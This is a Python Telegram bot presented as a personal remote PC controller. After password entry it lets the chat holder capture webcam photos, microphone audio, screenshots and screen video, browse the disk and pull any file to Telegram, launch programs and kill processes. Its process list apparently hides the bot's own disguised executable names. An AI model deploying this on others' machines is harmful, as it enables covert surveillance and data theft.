import telebot
from telebot import types
import os
from PIL import ImageGrab
import glob
import psutil
import pyaudio
import wave
import  cv2
import pyautogui
import numpy as np
import time
import configparser # или import yaml

config = configparser.ConfigParser() # или config = yaml.safe_load(open('config.yaml'))
config.read('config.ini') # или 'config.yaml'

TOKEN_BOT = config['BOT']['bot_token']
password = config['AUTH']['password']

bot = telebot.TeleBot(TOKEN_BOT)
authenticated_users = set()  # Сюда будем добавлять аутентифицированных пользователей

def main_function():
    @bot.message_handler(commands=['start'])
    def handle_start(message):
        if message.chat.id not in authenticated_users:
            bot.send_message(message.chat.id, "Пожалуйста, введите код:")
            bot.register_next_step_handler(message, handle_code)
        else:
            bot.send_message(message.chat.id, "Вы уже аутентифицированы. Можете пользоваться ботом.")

    def handle_code(message):
        code = message.text
        if code == password:
            authenticated_users.add(message.chat.id)  # Добавляем пользователя в список аутентифицированных
            bot.send_message(message.chat.id, "Доступ разрешен!")
            handle_all_messages(message)
        else:
            bot.send_message(message.chat.id, "Неверный код!")
            handle_start(message)

    def handle_all_messages(message):
        markup = types.ReplyKeyboardMarkup(row_width=2)
        item1 = types.KeyboardButton("Управление")
        item2 = types.KeyboardButton("Информация")
        item3 = types.KeyboardButton("Автор")
        markup.add(item1, item2, item3)
        bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)


    @bot.message_handler(func=lambda message: message.text == "Назад")
    def handle_back(message):
        handle_all_messages(message)  # Переход обратно к основному меню


    current_path = ""  # Переменная для хранения текущего пути


    @bot.message_handler(func=lambda message: message.text == "Поиск приложения")
    def handle_search_app(message):
        bot.send_message(message.chat.id, "Выберите способ поиска:\n1. Поиск по дискам\n2. Указать путь")
        bot.register_next_step_handler(message, search_app)


    def search_app(message):
        choice = message.text
        if choice == "1":
            search_by_drive(message)
        elif choice == "2":
            search_by_path(message)
        else:
            bot.send_message(message.chat.id, "Некорректный выбор. Пожалуйста, выберите 1 или 2.")
            handle_search_app(message)


    def search_by_drive(message):
        bot.send_message(message.chat.id, "Введите название приложения:")
        bot.register_next_step_handler(message, run_app_by_drive)


    def run_app_by_drive(message):
        app_name = message.text
        found_items = []

        for drive in ['C:', 'D:']:  # Перебираем диски C и D
            search_path = f"{drive}\\**\\{app_name}*"  # Ищем все файлы и папки, начинающиеся с указанного названия
            found_items.extend(glob.glob(search_path, recursive=True))  # Добавляем найденные элементы в список

        if found_items:
            bot.send_message(message.chat.id, f"Найденные элементы на дисках C и D:\n{', '.join(found_items)}")
            markup = types.ReplyKeyboardMarkup(row_width=1)
            for item_path in found_items:
                item_name = os.path.basename(item_path)
                btn = types.KeyboardButton(item_name)
                markup.add(btn)

            bot.send_message(message.chat.id, "Выберите папку или .exe файл для запуска:", reply_markup=markup)
            bot.register_next_step_handler(message, run_selected_item)
        else:
            bot.send_message(message.chat.id, f"Элементы с названием {app_name} не найдены на дисках C и D.")


    def search_by_path(message):
        bot.send_message(message.chat.id, "Введите путь для поиска файлов и папок:")
        bot.register_next_step_handler(message, show_items)


    def show_items(message):
        global current_path
        current_path = message.text
        items = [f for f in os.listdir(current_path)]  # Получаем список файлов и папок в указанном пути

        if items:
            markup = types.ReplyKeyboardMarkup(row_width=1)
            for item in items:
                btn = types.KeyboardButton(item)
                markup.add(btn)

            # Добавляем кнопку "Управление"
            control_btn = types.KeyboardButton("Управление")
            markup.add(control_btn)

            bot.send_message(message.chat.id, "Выберите папку или .exe файл для запуска:", reply_markup=markup)
            bot.register_next_step_handler(message, run_selected_item)
        else:
            bot.send_message(message.chat.id, "В указанном пути нет файлов и папок.")


    def run_selected_item(message):
        selected_item = message.text
        selected_item_path = os.path.join(current_path, selected_item)

        if os.path.isdir(selected_item_path):
            bot.send_message(message.chat.id, f"Выбрана папка {selected_item}.")
            show_items_in_folder(message, selected_item_path)
        else:
            if selected_item_path.endswith(".exe"):
                os.system(selected_item_path)  # Запускаем выбранный .exe файл
                bot.send_message(message.chat.id, f"Запущен файл {selected_item}.")
            else:
                bot.send_message(message.chat.id, "Выберите папку или .exe файл для запуска.")


    def show_items_in_folder(message, folder_path):
        global current_path
        current_path = folder_path
        items = [f for f in os.listdir(folder_path)]  # Получаем список файлов и папок в выбранной папке

        if items:
            markup = types.ReplyKeyboardMarkup(row_width=1)
            for item in items:
                btn = types.KeyboardButton(item)
                markup.add(btn)

            bot.send_message(message.chat.id, f"Выберите файл или папку в папке {os.path.basename(folder_path)}:",
                             reply_markup=markup)
            bot.register_next_step_handler(message, run_selected_item)
        else:
            bot.send_message(message.chat.id, f"В папке {os.path.basename(folder_path)} нет файлов и папок.")


    @bot.message_handler(func=lambda message: message.text == "Управление")
    def handle_control(message):
        print("Обработчик для 'Управление' вызван")
        markup = types.ReplyKeyboardMarkup(row_width=3)
        item_shutdown = types.KeyboardButton("Выключить компьютер")
        item_run_app = types.KeyboardButton("Поиск приложения")
        item_screenshot = types.KeyboardButton("Сделать скриншот")
        item_killtask = types.KeyboardButton("Убить процесс")
        item_hibernate = types.KeyboardButton("Режим гибернации")
        item_restart = types.KeyboardButton("Перезагрузка")
        item_cam = types.KeyboardButton("Веб камера")
        item_audiostart = types.KeyboardButton("Записать звук")
        item_starttaskmanager = types.KeyboardButton("Открыть диспетчер задач")
        item_recordvideo = types.KeyboardButton("Записать видео(15с.)")
        item_sendfile = types.KeyboardButton("Отправить файл")
        item_back = types.KeyboardButton("Назад")
        markup.add(item_shutdown, item_run_app, item_screenshot, item_killtask, item_hibernate, item_restart, item_audiostart, item_starttaskmanager, item_recordvideo, item_cam, item_sendfile, item_back)
        bot.send_message(message.chat.id, "Выберите действие:", reply_markup=markup)

    @bot.message_handler(func=lambda message: message.text == 'Открыть диспетчер задач')
    def open_task_manager(message):
        bot.send_message(message.chat.id, 'Открываю диспетчер задач')
        os.system('taskmgr')  # Эта команда откроет Диспетчер задач

    @bot.message_handler(func=lambda message: message.text == "Веб камера")
    def start_command(message):
        markup = telebot.types.InlineKeyboardMarkup()
        markup.add(telebot.types.InlineKeyboardButton("Веб камера (скр.)", callback_data="take_photo"))
        bot.send_message(message.chat.id, "Нажмите кнопку для снимка:", reply_markup=markup)

    @bot.callback_query_handler(func=lambda call: True)
    def callback_query(call):
        if call.data == "take_photo":
            try:
                cam = cv2.VideoCapture(0)
                ret, frame = cam.read()
                if not ret:
                    bot.answer_callback_query(call.id, "Ошибка доступа к камере.")
                    return
                cv2.imwrite("temp_photo.jpg", frame)
                cam.release()
                with open("temp_photo.jpg", "rb") as photo:
                    bot.send_photo(call.message.chat.id, photo)
                bot.answer_callback_query(call.id, "Фото успешно отправлено!")
            except Exception as e:
                bot.answer_callback_query(call.id, f"Ошибка: {e}")

    #Параметры
    FORMAT = pyaudio.paInt16
    CHANNELS = 1
    RATE = 44100
    CHUNK = 1024
    RECORD_SECONDS = 15 # Время записи звука
    WAVE_OUTPUT_FILENAME = "output.wav" # Выходной файл

    @bot.message_handler(func=lambda message: message.text == 'Записать звук')
    def record_audio(message):
        bot.send_message(message.chat.id, "Начинаю запись звука...")

        audio = pyaudio.PyAudio()
        stream = audio.open(format=FORMAT, channels=CHANNELS,
                            rate=RATE, input=True,
                            frames_per_buffer=CHUNK)

        frames = []

        for i in range(0, int(RATE / CHUNK * RECORD_SECONDS)):
            data = stream.read(CHUNK)
            frames.append(data)

        stream.stop_stream()
        stream.close()
        audio.terminate()

        waveFile = wave.open(WAVE_OUTPUT_FILENAME, 'wb')
        waveFile.setnchannels(CHANNELS)
        waveFile.setsampwidth(audio.get_sample_size(FORMAT))
        waveFile.setframerate(RATE)
        waveFile.writeframes(b''.join(frames))
        waveFile.close()

        audio_data = open(WAVE_OUTPUT_FILENAME, 'rb')
        bot.send_voice(message.chat.id, audio_data, duration=RECORD_SECONDS)

        bot.send_message(message.chat.id, "Запись завершена")

    @bot.message_handler(func=lambda message: message.text == "Информация")
    def handle_info(message):
        bot.send_message(message.chat.id, "Этот бот создан для управления компьютером!")

    @bot.message_handler(func=lambda message: message.text == "Автор")
    def handle_author(message):
        bot.send_message(message.chat.id, "Автор: @ViniLog.")

    @bot.message_handler(commands=['отключить'])
    def handle_shutdown_command(message):
        bot.send_message(message.chat.id, "Бот будет отключен.")
        bot.stop_polling()

    @bot.message_handler(func=lambda message: message.text == "Сделать скриншот")
    def send_screenshot(message):
        screenshot = ImageGrab.grab()  # Захватываем скриншот экрана
        screenshot.save("screenshot.png")  # Сохраняем скриншот в файл

        with open("screenshot.png", "rb") as photo:
            bot.send_photo(message.chat.id, photo)  # Отправляем скриншот в бот

        # Удаляем файл скриншота после отправки
        os.remove("screenshot.png")

    current_path = os.getcwd()

    @bot.message_handler(func=lambda message: message.text == "Отправить файл")
    def searchfileandsend(message):
        global current_path
        current_path = os.getcwd()
        show_items(message)

    def show_items(message):
        global current_path
        try:
            items = os.listdir(current_path)
        except FileNotFoundError:
            bot.send_message(message.chat.id, "Указанный путь не найден.")
            return searchfileandsend(message)
        except OSError as e:
            bot.send_message(message.chat.id, f"Ошибка доступа к пути: {e}")
            return searchfileandsend(message)

        markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
        for item in items:
            item_path = os.path.join(current_path, item)
            if os.path.isdir(item_path):
                markup.add(types.KeyboardButton(f"📁 {item}"))
            elif os.path.isfile(item_path):
                markup.add(types.KeyboardButton(item))
        markup.add(types.KeyboardButton("⬆️ Назад"))
        markup.add(types.KeyboardButton("Управление"))

        bot.send_message(message.chat.id, f"Текущий путь: {current_path}", reply_markup=markup)
        bot.register_next_step_handler(message, process_item_selection)

    def process_item_selection(message):
        global current_path
        selected_item = message.text

        if selected_item == "Управление":
            handle_control(message)
            return  # <--- Ключевое изменение: прерываем дальнейшую обработку

        if selected_item == "⬆️ Назад":
            current_path = os.path.dirname(current_path)
            if current_path == '':
                current_path = '/'
            show_items(message)
            return

        selected_item_path = os.path.join(current_path, selected_item.replace("📁 ", ""))

        if os.path.isdir(selected_item_path):
            current_path = selected_item_path
            show_items(message)
        elif os.path.isfile(selected_item_path):
            send_file(message, selected_item_path)
        else:
            bot.send_message(message.chat.id, "Неизвестная ошибка.")
            show_items(message)

    def send_file(message, file_path):
        try:
            with open(file_path, 'rb') as f:
                try:
                    bot.send_document(message.chat.id, f)
                except telebot.apihelper.ApiException as e:
                    if "FILE_SIZE_LIMIT" in str(e):
                        bot.send_message(message.chat.id, f"Файл слишком большой для отправки. Ограничение: {e}")
                    else:
                        bot.send_message(message.chat.id, f"Ошибка отправки файла: {e}")
        except FileNotFoundError:
            bot.send_message(message.chat.id, "Файл не найден.")
        except Exception as e:
            bot.send_message(message.chat.id, f"Произошла ошибка: {e}")
        finally:
            show_items(message)

    # Определяем функцию для обработки команды "Убить процесс"
    @bot.message_handler(func=lambda message: message.text == "Убить процесс")
    def handle_kill_process(message):
        processes = []
        for proc in psutil.process_iter():
            try:
                process_name = proc.name()
                if process_name not in ["svchost.exe", "svhost.exe", "lsass.exe", "explorer.exe", "sihost.exe", "ntoskrnl.exe", "wininit.exe", "dwm.exe", "smss.exe", "services.exe", "winlogon.exe", "csrss.exe", "conhost.exe", "RuntimeBroker.exe", "[医]维尼雷莫特.exe", "System", "System Idle Process", "Registry", "fontdrvhost.exe", "SearchHost.exe", "开始.exe", "start.exe"]:
                    processes.append(process_name)
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        if processes:
            markup = types.ReplyKeyboardMarkup(row_width=1)
            for process_name in processes:
                btn = types.KeyboardButton(process_name)
                markup.add(btn)

            # Добавляем кнопку "Управление"
            control_btn = types.KeyboardButton("Управление")
            markup.add(control_btn)

            bot.send_message(message.chat.id, "Выберите процесс для завершения:", reply_markup=markup)
            bot.register_next_step_handler(message, kill_selected_process)
        else:
            bot.send_message(message.chat.id, "Нет доступных процессов для завершения.")


    # Создаем словарь для отслеживания количества завершений процессов
    process_terminations = {}

    def kill_selected_process(message):
        selected_process = message.text
        for proc in psutil.process_iter():
            try:
                if proc.name() == selected_process:
                    proc.kill()
                    if selected_process in process_terminations:
                        process_terminations[selected_process] += 1
                    else:
                        process_terminations[selected_process] = 1
            except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
                pass

        # Формируем сообщение с общим количеством завершений процесса
        if selected_process in process_terminations:
            total_terminations = process_terminations[selected_process]
            bot.send_message(message.chat.id, f"Процесс {selected_process} успешно завершен. ({total_terminations} раз)")

        # После завершения процесса возвращаемся к меню управления
        handle_control(message)





    # Глобальная переменная для хранения выбранной команды
    selected_command = ""

    @bot.message_handler(func=lambda message: message.text == "Режим гибернации")
    def handle_hibernate(message):
        global selected_command
        selected_command = "hibernate"
        msg = bot.send_message(message.chat.id, "Введите через сколько минут перевести компьютер в режим гибернации:")
        bot.register_next_step_handler(msg, set_timer)

    @bot.message_handler(func=lambda message: message.text == "Перезагрузка")
    def handle_restart(message):
        global selected_command
        selected_command = "restart"
        msg = bot.send_message(message.chat.id, "Введите через сколько минут выполнить перезагрузку компьютера:")
        bot.register_next_step_handler(msg, set_timer)

    @bot.message_handler(func=lambda message: message.text == "Выключить компьютер")
    def handle_shutdown(message):
        global selected_command
        selected_command = "shutdown"
        msg = bot.send_message(message.chat.id, "Введите через сколько минут выключить компьютер:")
        bot.register_next_step_handler(msg, set_timer)

    # Обработчик команды для начала записи видео с экрана
    @bot.message_handler(func=lambda message: message.text == "Записать видео(15с.)")
    def start_screen_recording(message):
        duration = 18
        bot.send_message(message.chat.id, "Начинаю запись видео с экрана. Пожалуйста, подождите 15 секунд.")
        screen_width, screen_height = pyautogui.size()
        fourcc = cv2.VideoWriter_fourcc(*'XVID')
        out = cv2.VideoWriter('screen_record.mp4', fourcc, 20.0, (screen_width, screen_height))

        start_time = time.time()
        while (time.time() - start_time) < duration:
            screenshot = pyautogui.screenshot()
            frame = np.array(screenshot)
            frame = cv2.cvtColor(frame, cv2.COLOR_BGR2RGB)
            out.write(frame)

            # Отображение курсора мыши
            x, y = pyautogui.position()
            cv2.circle(frame, (x, y), 10, (0, 255, 0), -1)

        out.release()
        cv2.destroyAllWindows()

        # Отправка видео в Telegram
        video = open('screen_record.mp4', 'rb')
        bot.send_video(message.chat.id, video=video)

    def set_timer(message):
        try:
            time = int(message.text)
            if selected_command == "hibernate":
                os.system(f"shutdown /h /t {time * 60}")
                bot.send_message(message.chat.id, f"Компьютер будет переведен в режим гибернации через {time} минут.")
            elif selected_command == "restart":
                os.system(f"shutdown /r /t {time * 60}")
                bot.send_message(message.chat.id, f"Компьютер будет перезагружен через {time} минут.")
            elif selected_command == "shutdown":
                if os.name == 'nt':
                    os.system(f"shutdown /s /t {time * 60}")
                    bot.send_message(message.chat.id, f"Компьютер будет выключен через {time} минут.")
                elif os.name == 'posix':
                    os.system(f"sudo shutdown -h +{time}")
                    bot.send_message(message.chat.id, f"Компьютер будет выключен через {time} минут.")
        except ValueError:
            bot.send_message(message.chat.id, "Пожалуйста, введите корректное число минут.")

    print("Бот запущен.")

while True:
    try:
        main_function()
        bot.polling()
    except Exception as e:
        print(f"Произошла ошибка: {e}. Перезапуск через 5 секунд...")
        time.sleep(5)  # Задержка перед повторным запуском
bot.polling()